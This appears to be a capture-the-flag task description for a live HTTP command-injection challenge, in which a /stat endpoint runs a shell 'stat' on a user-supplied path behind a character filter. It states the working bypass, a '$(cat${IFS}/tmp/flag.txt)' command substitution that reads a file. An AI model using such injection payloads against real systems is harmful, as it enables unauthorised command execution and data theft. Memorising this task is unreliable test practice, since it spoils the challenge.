# Command Injection (live HTTP)

`http://HOST:PORT/`. `GET /stat?path=<p>` runs `stat -c %s /tmp/<p>` with a shell
and returns the output — injectable, but a filter blocks `; | & backtick`, all
whitespace and `..`, so `; cat /tmp/flag.txt` is out. It does **not** block `$ (
) { }`, leaving shell command substitution and `${IFS}` open. Bypass the filter
to read `/tmp/flag.txt`; the flag comes back in `stat`'s error message.

    GET /stat?path=readme                 -> a size
    GET /stat?path=$(cat${IFS}/tmp/flag.txt)  -> flag reflected in the error
